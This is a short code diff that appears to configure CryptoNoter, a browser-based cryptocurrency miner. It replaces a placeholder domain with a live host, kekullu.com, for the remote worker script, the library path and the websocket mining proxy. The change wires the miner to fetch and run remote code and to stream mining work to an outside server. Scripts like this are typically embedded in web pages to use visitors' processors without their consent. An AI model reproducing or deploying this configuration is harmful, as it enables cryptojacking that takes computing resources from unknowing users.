@@ -66,7 +66,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", "https://%CryptoNoter_domain%/worker.js", true);
+            xhr.open("get", "https://kekullu.com/worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
@@ -489,6 +489,6 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://%CryptoNoter_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]]
+    LIB_URL: "https://kekullu.com/lib/",
+    WEBSOCKET_SHARDS: [["wss://kekullu.com/proxy"]]
 };
